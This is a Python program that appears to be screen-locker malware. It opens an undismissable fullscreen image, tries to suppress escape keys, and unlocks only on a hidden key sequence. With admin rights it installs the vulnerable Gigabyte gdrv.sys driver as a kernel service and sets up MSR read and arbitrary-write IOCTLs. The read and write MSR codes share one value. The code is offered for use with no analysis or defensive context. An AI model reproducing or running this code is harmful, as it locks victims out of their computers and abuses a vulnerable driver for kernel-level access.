import ctypes
import os
import subprocess
import shutil
import sys
import tempfile
import tkinter as tk
from PIL import Image, ImageTk
from ctypes import wintypes

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002

IOCTL_READ_MSR = 0xC3502580
IOCTL_WRITE_MSR = 0xC3502580
IOCTL_ARBITRARY_WRITE = 0xC3502808

class GdrvExploit:
    def __init__(self):
        self.driver_handle = None
        
    def load_gdrv(self):
        if getattr(sys, 'frozen', False):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.dirname(os.path.abspath(__file__))
        
        driver_src = os.path.join(base_path, "gdrv.sys")
        driver_dest = r"C:\Windows\System32\drivers\gdrv.sys"
        
        shutil.copy(driver_src, driver_dest)
        subprocess.run(f'sc create gdrv type= kernel binPath= "{driver_dest}"', shell=True, capture_output=True)
        subprocess.run('sc start gdrv', shell=True, capture_output=True)
        
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        self.driver_handle = kernel32.CreateFileW("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, None)
        return self.driver_handle != -1
    
    def read_msr(self, msr_index):
        class MSRBuffer(ctypes.Structure):
            _fields_ = [("operation", ctypes.c_uint32), ("msr_index", ctypes.c_uint32), ("low_value", ctypes.c_uint32), ("high_value", ctypes.c_uint32)]
        buffer = MSRBuffer()
        buffer.operation = 1
        buffer.msr_index = msr_index
        bytes_returned = ctypes.c_uint32(0)
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        result = kernel32.DeviceIoControl(self.driver_handle, IOCTL_READ_MSR, ctypes.byref(buffer), ctypes.sizeof(buffer), ctypes.byref(buffer), ctypes.sizeof(buffer), ctypes.byref(bytes_returned), None)
        if result:
            return (ctypes.c_uint64(buffer.high_value << 32) | buffer.low_value).value
        return None
    
    def cleanup(self):
        if self.driver_handle:
            ctypes.WinDLL('kernel32').CloseHandle(self.driver_handle)
        subprocess.run('sc stop gdrv', shell=True, capture_output=True)
        subprocess.run('sc delete gdrv', shell=True, capture_output=True)

class FullscreenApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
        
        self.root.bind('<Escape>', self.disable)
        self.root.bind('<Alt-F4>', self.disable)
        self.root.bind('<Control-Alt-Delete>', self.disable)
        self.root.bind('<Alt-Tab>', self.disable)
        self.root.bind('<Win_L>', self.disable)
        self.root.bind('<Win_R>', self.disable)
        
        image_path = self.get_image_path()
        
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        
        img = Image.open(image_path)
        img = img.resize((screen_width, screen_height), Image.Resampling.LANCZOS)
        self.photo = ImageTk.PhotoImage(img)
        
        label = tk.Label(self.root, image=self.photo)
        label.pack(fill=tk.BOTH, expand=True)
        
        self.key_sequence = []
        self.secret_code = ['q', 'w', 'e', 'r', 't', 'y', 'z']
        
        self.root.bind('<Key>', self.check_code)
        
        if ctypes.windll.shell32.IsUserAnAdmin():
            self.exploit = GdrvExploit()
            self.exploit.load_gdrv()
        
        self.root.mainloop()
    
    def get_image_path(self):
        if getattr(sys, 'frozen', False):
            temp_dir = tempfile.gettempdir()
            temp_image = os.path.join(temp_dir, "secure_image.png")
            if not os.path.exists(temp_image):
                shutil.copy(os.path.join(sys._MEIPASS, "image.png"), temp_image)
            return temp_image
        return "image.png"
    
    def disable(self, event):
        return "break"
    
    def check_code(self, event):
        self.key_sequence.append(event.keysym.lower())
        if len(self.key_sequence) > 7:
            self.key_sequence.pop(0)
        if self.key_sequence == self.secret_code:
            if hasattr(self, 'exploit'):
                self.exploit.cleanup()
            self.root.quit()
            self.root.destroy()
            os._exit(0)

if __name__ == "__main__":
    app = FullscreenApp()
